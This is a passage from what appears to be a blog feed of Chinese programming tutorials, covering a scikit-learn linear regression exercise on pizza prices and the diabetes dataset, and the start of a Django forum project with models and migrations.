class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> linear_model <span class="comment"># 导入线性模型</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt <span class="comment"># 绘图</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># X 表示匹萨尺寸 Y表示匹萨价格</span></span><br><span class="line">X =[[<span class="number">6</span>],[<span class="number">8</span>],[<span class="number">10</span>],[<span class="number">14</span>],[<span class="number">18</span>]]</span><br><span class="line">Y = [[<span class="number">7</span>],[<span class="number">9</span>],[<span class="number">13</span>],[<span class="number">17.5</span>],[<span class="number">18</span>]]</span><br><span class="line"></span><br><span class="line">print(<span class="string">u'数据集X:'</span>,X)</span><br><span class="line">print(<span class="string">u'数据集Y:'</span>,Y)</span><br><span class="line"><span class="comment"># 回归训练</span></span><br><span class="line">clf2 = linear_model.LinearRegression() <span class="comment"># 使用线性回归</span></span><br><span class="line">clf2.fit(X,Y) <span class="comment"># 导入数据集</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预测一张12英寸的价格</span></span><br><span class="line">res = clf2.predict(np.array([<span class="number">12</span>]).reshape(<span class="number">1</span>,<span class="number">1</span>))[<span class="number">0</span>]</span><br><span class="line">print(<span class="string">u'预测一张12英寸的匹萨价格：$%.2f'</span>%res)</span><br></pre></td></tr></table></figure><pre><code>数据集X: [[6], [8], [10], [14], [18]]数据集Y: [[7], [9], [13], [17.5], [18]]预测一张12英寸的匹萨价格：$13.68</code></pre><ul><li>请解释np.array([12]).reshape(1,1)及字符串前加u的意义</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><ul><li>预测数据X2 = [[0],[10],[14],[25]]的结果</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 预测数据X2 = [[0],[10],[14],[25]]</span></span><br><span class="line">X2 = [[<span class="number">0</span>],[<span class="number">10</span>],[<span class="number">14</span>],[<span class="number">25</span>]]</span><br><span class="line">Y2 = clf2.predict(X2)</span><br><span class="line">print(Y2)</span><br></pre></td></tr></table></figure><pre><code>[[ 1.96551724] [11.72844828] [15.63362069] [26.37284483]]</code></pre><ul><li>绘制线性回归图形</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">plt.figure()</span><br><span class="line">plt.title(<span class="string">u'diameter-cost curver'</span>) <span class="comment">#标题</span></span><br><span class="line">plt.xlabel(<span class="string">u'diameter'</span>) <span class="comment">#x轴坐标</span></span><br><span class="line">plt.ylabel(<span class="string">u'cost'</span>)   <span class="comment"># y轴</span></span><br><span class="line">plt.axis([<span class="number">0</span>,<span class="number">25</span>,<span class="number">0</span>,<span class="number">25</span>]) <span class="comment">#区间</span></span><br><span class="line">plt.grid(<span class="literal">True</span>) <span class="comment"># 显示网格</span></span><br><span class="line">plt.plot(X,Y,<span class="string">'k.'</span>) <span class="comment">#绘制训练数据集散点图</span></span><br><span class="line">plt.plot(X2,Y2,<span class="string">'g-'</span>)<span class="comment"># 绘制预测数据集直线</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426output03.png" alt="png"></p><ul><li>线性模型：$$y = βX+b$$<br>其中回归系数β保存在coef_方法中，截距保存在intercept_中，<br>score(X,y,sample_weight=None) 评分函数，返回一个小于1的得分，可能会小于0</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#打印系数、截距、评分函数</span></span><br><span class="line">print(<span class="string">u'系数'</span>,clf2.coef_)</span><br><span class="line">print(<span class="string">u'截距'</span>,clf2.intercept_)</span><br><span class="line">print(<span class="string">u'评分函数'</span>,clf2.score(X,Y))</span><br></pre></td></tr></table></figure><pre><code>系数 [[0.9762931]]截距 [1.96551724]评分函数 0.9100015964240102</code></pre><h3 id="步骤四：糖尿病数据集划分"><a href="#步骤四：糖尿病数据集划分" class="headerlink" title="步骤四：糖尿病数据集划分"></a>步骤四：糖尿病数据集划分</h3><ul><li>加载diabetes数据集,并打印数据集长度、数据类型、前四个样本数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据 10*442</span></span><br><span class="line">d =datasets.load_diabetes()</span><br><span class="line">x = d.data</span><br><span class="line">print(<span class="string">u'获取x特征'</span>,len(x),x.shape,x[:<span class="number">4</span>])</span><br></pre></td></tr></table></figure><pre><code>获取x特征 442 (442, 10) [[ 0.03807591  0.05068012  0.06169621  0.02187235 -0.0442235  -0.03482076  -0.04340085 -0.00259226  0.01990842 -0.01764613] [-0.00188202 -0.04464164 -0.05147406 -0.02632783 -0.00844872 -0.01916334   0.07441156 -0.03949338 -0.06832974 -0.09220405] [ 0.08529891  0.05068012  0.04445121 -0.00567061 -0.04559945 -0.03419447  -0.03235593 -0.00259226  0.00286377 -0.02593034] [-0.08906294 -0.04464164 -0.01159501 -0.03665645  0.01219057  0.02499059  -0.03603757  0.03430886  0.02269202 -0.00936191]]</code></pre><ul><li>获取第3列体重特征的数据,并打印前四行的数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x_one = x[:,np.newaxis,<span class="number">2</span>]</span><br><span class="line">print(x_one[:<span class="number">4</span>])</span><br></pre></td></tr></table></figure><pre><code>[[ 0.06169621] [-0.05147406] [ 0.04445121] [-0.01159501]]</code></pre><ul><li>获取类标target,并打印前四个</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">y = d.target</span><br><span class="line">print(<span class="string">u'target:'</span>,y[:<span class="number">4</span>])</span><br></pre></td></tr></table></figure><pre><code>target: [151.  75. 141. 206.]</code></pre><ul><li>x特征划分：训练集和测试集；后42行作为测试集，剩余的作为训练集</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#训练集</span></span><br><span class="line">x_train = x_one[:<span class="number">-42</span>]</span><br><span class="line">y_train = y[:<span class="number">-42</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试集</span></span><br><span class="line">x_test = x_one[<span class="number">-42</span>:]</span><br><span class="line">y_test = y[<span class="number">-42</span>:]</span><br></pre></td></tr></table></figure><h3 id="步骤五-糖尿病的线性回归实现"><a href="#步骤五-糖尿病的线性回归实现" class="headerlink" title="步骤五:糖尿病的线性回归实现"></a>步骤五:糖尿病的线性回归实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> linear_model</span><br><span class="line">clf = linear_model.LinearRegression()</span><br><span class="line"><span class="comment"># 训练</span></span><br><span class="line">clf.fit(x_train,y_train)</span><br><span class="line"><span class="comment">#预测</span></span><br><span class="line">pre = clf.predict(x_test)</span><br><span class="line">print(<span class="string">u'预测结果：&#123;&#125;\n'</span>.format(pre))</span><br><span class="line">print(<span class="string">u'真实结果：'</span>,y_test)</span><br></pre></td></tr></table></figure><pre><code>预测结果：[196.51241167 109.98667708 121.31742804 245.95568858 204.75295782 270.67732703  75.99442421 241.8354155  104.83633574 141.91879342 126.46776938 208.8732309  234.62493762 152.21947611 159.42995399 161.49009053 229.47459628 221.23405012 129.55797419 100.71606266 118.22722323 168.70056841 227.41445974 115.13701842 163.55022706 114.10695016 120.28735977 158.39988572 237.71514243 121.31742804  98.65592612 123.37756458 205.78302609  95.56572131 154.27961264 130.58804246  82.17483382 171.79077322 137.79852034 137.79852034 190.33200206  83.20490209]真实结果： [175.  93. 168. 275. 293. 281.  72. 140. 189. 181. 209. 136. 261. 113. 131. 174. 257.  55.  84.  42. 146. 212. 233.  91. 111. 152. 120.  67. 310.  94. 183.  66. 173.  72.  49.  64.  48. 178. 104. 132. 220.  57.]</code></pre><h3 id="步骤六-对上述预测结果进行评价"><a href="#步骤六-对上述预测结果进行评价" class="headerlink" title="步骤六:对上述预测结果进行评价"></a>步骤六:对上述预测结果进行评价</h3><ul><li>分别从预测结果和真实结果之间的平方和、线性回归模型的系数、截距、方差</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cost = np.mean(y_test-pre)**<span class="number">2</span></span><br><span class="line">print(<span class="string">'平方和：&#123;&#125;\n'</span>.format(cost))</span><br><span class="line">print(<span class="string">'系数：&#123;&#125;\n'</span>.format(clf.coef_))</span><br><span class="line">print(<span class="string">'截距：&#123;&#125;\n'</span>.format(clf.intercept_))</span><br><span class="line">print(<span class="string">'决定系数：&#123;&#125;\n'</span>.format(clf.score(x_test,y_test)))</span><br></pre></td></tr></table></figure><pre><code>平方和：83.19234082703763系数：[955.70303385]截距：153.00018395675963决定系数：0.42720426706720194</code></pre><p>​    </p><h3 id="步骤七-绘图"><a href="#步骤七-绘图" class="headerlink" title="步骤七:绘图"></a>步骤七:绘图</h3><ul><li>分别绘制出测试集的真实散点图，预测的线性图，以及画出各个真实点到预测点的距离，并保存到diabetes.png中，dpi=300</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.title(<span class="string">'diabetes'</span>)</span><br><span class="line">plt.xlabel(<span class="string">'x'</span>)</span><br><span class="line">plt.ylabel(<span class="string">'y'</span>)</span><br><span class="line">plt.plot(x_test,y_test,<span class="string">'k.'</span>)<span class="comment"># 测试集真实散点图</span></span><br><span class="line">plt.plot(x_test,pre,<span class="string">'g-'</span>)<span class="comment"># 预测线性直线</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制真实点到预测点的线段</span></span><br><span class="line"><span class="keyword">for</span> idx ,m <span class="keyword">in</span> enumerate(x_test):</span><br><span class="line">    plt.plot([m,m],[y_test[idx],pre[idx]],<span class="string">'r-'</span>)</span><br><span class="line">    </span><br><span class="line">plt.savefig(<span class="string">'diabetes.png'</span>,dpi=<span class="number">300</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426output04.png" alt="png"></p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Django】2. Django入门与实践-基础</title>
      <link href="2020/04/26/2.%20Django%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E8%B7%B5-%E5%9F%BA%E7%A1%80/"/>
      <url>2020/04/26/2.%20Django%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E8%B7%B5-%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>本文主要内容：简单讨论了项目的背景知识，然后学习Django的基础，包括模型，管理后台，视图，模板和路由等。</p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在第一节入门中，安装了项目所需要的一切，安装的是 Python3.6，并且在虚拟环境中运行 Django1.11，本文继续在这个项目上编写代码。</p><p>本文先讨论一些项目的背景知识，然后在学习Django的基础，包括：模型（models），管理后台（admin），视图（views）,模板（templates）和路由（URLs）</p><h2 id="论坛项目"><a href="#论坛项目" class="headerlink" title="论坛项目"></a>论坛项目</h2><p>通过实际的项目学习知识，是个不错的方法，所以在学习模型，视图等其它有趣部分前，简要的讨论我将要开发的这个项目。</p><p>下图关于Web应用程序建模和设计上的一些见解。Web开发和软件开发可不仅仅只是编码。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django001.png" alt=""></p><h3 id="用例图"><a href="#用例图" class="headerlink" title="用例图"></a>用例图</h3><p>这个项目是一个论坛系统，整个项目的构思是维护几个论坛版块（boards），每个版块像一个分类一样。在指定的版块里面，用户可以通过创建新主题（Topic）开始讨论，其他用户可以参与讨论回复。</p><p>首先需要找到一种方法来区分普通用户和管理员用户，因为只有管理员可以创建版块。下图概述了主要的用例和每种类型的用户角色：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django002.png" alt=""></p><center>图1：Web Board提供的核心功能用例图</center><br>### 类图<p>从用例图中，可以开始思考项目所需的实体类有哪些。这些实体就是我们要创建的模型，它与我们的Django应用程序处理的数据非常密切。</p><p>为了能够实现上面描述的用例，我们需要至少实现下面几个模型：Board，Topic，Post和User。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django003.png" alt=""></p><center>图2：Web Board类图</center><br><ul><li>Board：版块</li><li>Topic：主题</li><li>Post：帖子（译注：其实就是主题的回复或评论）</li></ul><p>花点时间考虑模型之间如何相互关联也很重要。类与类之间的实线告诉我们，在一个主题（Topic）中，我们需要有一个字段（译注：其实就是通过外键来关联）来确定它属于哪个版块（Board）。同样，帖子（Post）也需要一个字段来表示它属于哪个主题，这样我们就可以列出在特定主题内创建的帖子。最后，我们需要一个字段来表示主题是谁发起的，帖子是谁发的。</p><p>用户和版块之间也有联系，谁创建的版块。但是这些信息与应用程序无关。还有其他方法可以跟踪这些信息，稍后会谈到。</p><p>现在我们的类图有基本的表现形式，还要考虑这些模型将承载哪些信息。避免让事情变得复杂，试着先把重要的内容列出来，这些内容是启动项目需要的信息。后面我们再使用 Django 的迁移（Migrations）功能来改进模型，将在下一节中详细了解这些内容。</p><p>但就目前而言，这是模型最基本的内容：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django004.png" alt=""></p><center>图3：强调类（模型）之间关系的类图</center>这个类图强调的是模型之间的关系，这些线条和箭头最终会在稍后转换为字段。<p>对于 <strong>Board</strong> 模型，我们将从两个字段开始：name 和 description。 name字段必须是唯一的，为了避免有重复的名称。description 用于说明这个版块是做什么用的。</p><p><strong>Topic</strong> 模型包括四个字段：subject 表示主题内容，last_update 用来定义话题的排序，starter 用来识别谁发起的话题，board 用于指定它属于哪个版块。</p><p><strong>Post</strong> 模型有一个 message 字段，用于存储回复的内容，created_at 在排序时候用（最先发表的帖子排最前面），updated_at 告诉用户是否更新了内容，同时，还需要有对应的 User 模型的引用，Post 由谁创建的和谁更新的。</p><p>最后是 <strong>User</strong> 模型。在类图中，我只提到了字段 username，password，email， is_superuser 标志，因为这几乎是我们现在要使用的所有东西。</p><p>需要注意的是，<strong>我们不需要创建 User 模型</strong>，因为Django已经在contrib包中内置了User模型，我们将直接拿来用。</p><p>关于类图之间的对应关系（数字 1，0..* 等等），这里教你如何阅读：</p><p>一个topic 必须与一个（1）Board（这意味着它不能为空）相关联，但是 Board 下面可能与许多个或者0个 topic 关联 (0..*)。这意味着 Board 下面可能没有主题。（译注：一对多关系）</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django005.png" alt=""></p><p>一个 Topic 至少有一个 Post（发起话题时，同时会发布一个帖子），并且它也可能有许多 Post（1..*）。一个Post 必须与一个并且只有一个Topic（1）相关联。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django006.png" alt=""></p><p>一个 Topic 必须有一个且只有一个 User 相关联，topic 的发起者是（1）。而一个用户可能有很多或者没有 topic（0..*）。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django007.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django008.png" alt=""></p><p>Post 必须有一个并且只有一个与之关联的用户，用户可以有许多或没有 Post（0..*）。Post 和 User之间的第二个关联是直接关联（参见该行最后的箭头），就是 Post 可以被用户修改（updated_by），updated_by 有可能是空（Post 没有被修改）</p><p>画这个类图的另一种方法是强调字段而不是模型之间的关系：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django009.png" alt=""></p><center>图4：强调类（模型）与属性（字段）的类图</center>上面的表示方式与前面的表示方式是对等的，不过这种方式更接近我们将要使用 Django Models API 设计的内容。在这种表示方式中，我们可以更清楚地看到，在 Post 模型中，关联了 Topic，created_by（创建者）和 updated_by（更新者）字段。另一个值得注意的事情是，在 Topic 模型中，有一个名为` posts（）`的操作（一个类方法）。我们将通过反向关系来实现这一目标，Django 将自动在数据库中执行查询以返回特定主题的所有帖子列表。<p>好了，现在已经够UML了！为了绘制本节介绍的图表，我使用了<a href="http://staruml.io/" target="_blank" rel="noopener">StarUML </a>工具。</p><h3 id="线框图（原型图）"><a href="#线框图（原型图）" class="headerlink" title="线框图（原型图）"></a>线框图（原型图）</h3><p>花了一些时间来设计应用程序的模型后，创建一些线框来定义需要完成的工作，并且清楚地了解我们将要做什么。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django0010.png" alt=""></p><p>基于线框图，我们可以更深入地了解应用程序中涉及的实体。</p><p>首先，我们需要在主页上显示所有版块：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django0011.png" alt=""></p><center>图5：论坛项目线框主页列出所有可用的版块</center>如果用户点击一个链接，比如点击Django版块，它应该列出所有Django相关的主题：<p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django01.jpg" alt=""></p><center>图6：论坛项目线框图列出了Django版块中的所有主题</center>这里有两个入口：用户点击“new topic“ 按钮创建新主题，或者点击主题链接查看或参与讨论。<p>“new topic” 页面：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django0012.png" alt=""></p><p>现在，主题页面显示了帖子和讨论：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django0013.png" alt=""></p><p>如果用户点击回复按钮，将看到下面这个页面，并以倒序的方式（最新的在第一个）显示帖子列表：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django0014.png" alt=""></p><p>绘制这些线框，你可以使用<a href="https://draw.io/" target="_blank" rel="noopener">draw.io</a>服务，它是免费的。</p><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>这些模型基本上代表了应用程序的数据库设计。接下来要做的是创建 Django 所表示的类，这些类是上面建模的类：<strong>Board，Topic和Post</strong>。<strong>User</strong> 模型被命名为内置应用叫<strong>auth</strong>，它以命名空间<strong>django.contrib.auth</strong> 的形式出现在 <code>INSTALLED_APPS</code> 配置中。</p><p>我们要做的工作都在 boards/models.py 文件中。以下是我们在Django应用程序中如何表示类图的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> User</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Board</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">30</span>, unique=<span class="literal">True</span>)</span><br><span class="line">    description = models.CharField(max_length=<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Topic</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    subject = models.CharField(max_length=<span class="number">255</span>)</span><br><span class="line">    last_updated = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line">    board = models.ForeignKey(Board, related_name=<span class="string">'topics'</span>)</span><br><span class="line">    starter = models.ForeignKey(User, related_name=<span class="string">'topics'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Post</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    message = models.TextField(max_length=<span class="number">4000</span>)</span><br><span class="line">    topic = models.ForeignKey(Topic, related_name=<span class="string">'posts'</span>)</span><br><span class="line">    created_at = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line">    updated_at = models.DateTimeField(null=<span class="literal">True</span>)</span><br><span class="line">    created_by = models.ForeignKey(User, related_name=<span class="string">'posts'</span>)</span><br><span class="line">    updated_by = models.ForeignKey(User, null=<span class="literal">True</span>, related_name=<span class="string">'+'</span>)</span><br></pre></td></tr></table></figure><p>所有模型都是<strong>django.db.models.Model</strong>类的子类。每个类将被转换为数据库表。每个字段由 <strong>django.db.models.Field</strong>子类（内置在Django core）的实例表示，它们并将被转换为数据库的列。</p><p>字段 <code>CharField</code>,<code>DateTimeField</code>等等，都是 <strong>django.db.models.Field</strong> 的子类，包含在Django的核心里面,随时可以使用。</p><p>在这里，我们仅使用 <code>CharField</code>，<code>TextField</code>，<code>DateTimeField</code>，和<code>ForeignKey</code> 字段来定义我们的模型。不过在Django提供了更广泛的选择来代表不同类型的数据，例如 <code>IntegerField</code>，<code>BooleanField</code>， <code>DecimalField</code>和其它一些字段。我们会在需要的时候提及它们。</p><p>有些字段需要参数，例如<code>CharField</code>。我们应该始终设定一个 max_length。这些信息将用于创建数据库列。Django需要知道数据库列需要多大。该<code>max_length</code>参数也将被Django Forms API用来验证用户输入。</p><p>在<code>Board</code>模型定义中，更具体地说，在<code>name</code>字段中，我们设置了参数 <code>unique=True</code>，顾名思义，它将强制数据库级别字段的唯一性。</p><p>在<code>Post</code>模型中，<code>created_at</code>字段有一个可选参数，<code>auto_now_add</code>设置为<code>True</code>。这将告诉Django创建<code>Post</code>对象时为当前日期和时间。</p><p>模型之间的关系使用<code>ForeignKey</code>字段。它将在模型之间创建一个连接，并在数据库级别创建适当的关系（译注：外键关联）。该<code>ForeignKey</code>字段需要一个位置参数<code>related_name</code>，用于引用它关联的模型。（译注：例如 <code>created_by</code>是外键字段，关联的User模型，表明这个帖子是谁创建的，<code>related_name=posts</code> 表示在<code>User</code>那边可以使用 <code>user.posts</code>来查看这个用户创建了哪些帖子）</p><p>例如，在<code>Topic</code>模型中，<code>board</code>字段是<code>Board</code>模型的<code>ForeignKey</code>。它告诉Django，一个<code>Topic</code>实例只涉及一个<code>Board</code>实例。<code>related_name</code>参数将用于创建反向关系，<code>Board</code>实例通过属性<code>topics</code>访问属于这个版块下的<code>Topic</code>列表。</p><p>Django自动创建这种反向关系，<code>related_name</code>是可选项。但是，如果我们不为它设置一个名称，Django会自动生成它：<code>(class_name)_set</code>。例如，在<code>Board</code>模型中，所有<code>Topic</code>列表将用<code>topic_set</code>属性表示。而这里我们将其重新命名为了<code>topics</code>，以使其感觉更自然。</p><p>在<code>Post</code>模型中，该<code>updated_by</code>字段设置<code>related_name=&#39;+&#39;</code>。这指示Django我们不需要这种反向关系，所以它会被忽略（译注：也就是说我们不需要关系用户修改过哪些帖子）。</p><p>下面可以看到类图和Django模型的源代码之间的比较，绿线表示我们如何处理反向关系。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django02.jpg" alt=""></p><p>这时，你可能会问自己：“主键/ ID呢？”？如果我们没有为模型指定主键，Django会自动为我们生成它。所以现在一切正常。在下一节中，您将看到它是如何工作的。</p><h3 id="迁移模型"><a href="#迁移模型" class="headerlink" title="迁移模型"></a>迁移模型</h3><p>下一步是告诉Django创建数据库，以便我们可以开始使用它。</p><p>打开终端 ，激活虚拟环境，转到 manage.py文件所在的文件夹，然后运行以下命令：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">python manage.py makemigrations</code></pre></figure>会看到输出内容是：<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Migrations <span class="k">for</span> <span class="s1">'boards'</span>:  boards/migrations/0001_initial.py    - Create model Board    - Create model Post    - Create model Topic    - Add field topic to post    - Add field updated_by to post</code></pre></figure><p>如图：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django03.jpg" alt=""></p><p>此时，Django 在 <code>boards/migrations</code>目录创建了一个名为 <code>0001_initial.py</code>的文件。它代表了应用程序模型的当前状态。再下一步，Django将使用该文件创建表和列。</p><p>迁移文件将被翻译成SQL语句。如果您熟悉SQL，则可以运行以下命令来检验将是要被数据库执行的SQL指令</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">python manage.py sqlmigrate boards 0001</code></pre></figure>如图：![](https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django04.jpg)<p>如果你不熟悉SQL，也不要担心。在本系列教程中，我们不会直接使用SQL。所有的工作都将使用Django ORM来完成，它是一个与数据库进行通信的抽象层。</p><p>下一步是将我们生成的迁移文件应用到数据库：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">python manage.py migrate</code></pre></figure>输出内容应该是这样的：<p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django05.jpg" alt=""></p><p>因为这是我们第一次迁移数据库，所以<code>migrate</code>命令把Django contrib app 中现有的迁移文件也执行了，这些内置app列在了<code>INSTALLED_APPS</code>。这是预料之中的。</p><p><code>Applying boards.0001_initial... OK</code>是我们在上一步中生成的迁移脚本</p><p>好了！我们的数据库已经可以使用了。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django0015.png" alt=""></p><blockquote><p>需要注意的是SQLite是一个产品级数据库。SQLite被许多公司用于成千上万的产品，如所有Android和iOS设备，主流的Web浏览器，Windows 10，MacOS等。</p></blockquote><blockquote><p>但这不适合所有情况。SQLite不能与MySQL，PostgreSQL或Oracle等数据库进行比较。大容量的网站，密集型写入的应用程序，大的数据集，高并发性的应用使用SQLite最终都会导致问题。</p></blockquote><blockquote><p>我们将在开发项目期间使用SQLite，因为它很方便，不需要安装其他任何东西。当我们将项目部署到生产环境时，再将切换到PostgreSQL（译注：后续，我们后面可能使用MySQL）。对于简单的网站这种做法没什么问题。但对于复杂的网站，建议在开发和生产中使用相同的数据库。</p></blockquote><h3 id="试验Models-API"><a href="#试验Models-API" class="headerlink" title="试验Models API"></a>试验Models API</h3><p>使用Python进行开发的一个重要优点是交互式shell,这是一种快速尝试和试验API的方法</p><p>可以使用<strong>manage.py</strong> 工具加载我们的项目来启动 Python shell ：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">python manage.py shell</code></pre></figure>如图：![](https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django06.jpg)<p>这与直接输入<code>python</code>指令来调用交互式控制台是非常相似的，除此之外，项目将被添加到<code>sys.path</code>并加载Django。这意味着我们可以在项目中导入我们的模型和其他资源并使用它。</p><p>让我们从导入Board类开始：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> boards.models <span class="keyword">import</span> Board</span><br></pre></td></tr></table></figure><p>要创建新的 boarrd 对象，我们可以执行以下操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">board = Board(name=<span class="string">'Django'</span>, description=<span class="string">'This is a board about Django.'</span>)</span><br></pre></td></tr></table></figure><p>为了将这个对象保存在数据库中，我们必须调用save方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 